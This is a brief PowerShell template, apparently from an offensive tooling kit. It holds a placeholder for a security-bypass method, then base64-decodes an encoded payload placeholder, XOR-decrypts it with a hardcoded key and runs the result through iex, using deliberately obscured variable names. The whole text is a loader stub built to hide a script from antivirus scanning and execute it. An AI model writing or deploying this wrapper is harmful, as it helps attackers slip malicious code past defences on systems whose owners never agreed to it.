<bypass_method>

$e_bbbb = "<encode_content>" ;
$e_cbbbbbbb = [Convert]::FromBase64String($e_bbbb);
$key = [Text.Encoding]::UTF8.GetBytes("s0m3sh1tttttttt");
$keyLength = $key.Length
for ($i = 0; $i -lt $e_cbbbbbbb.Length; $i++) {$e_cbbbbbbb[$i] = $e_cbbbbbbb[$i] -bxor $key[$i % $keyLength]}
$o_r_ccccccccc = [Text.Encoding]::UTF8.GetString($e_cbbbbbbb)
iex $o_r_ccccccccc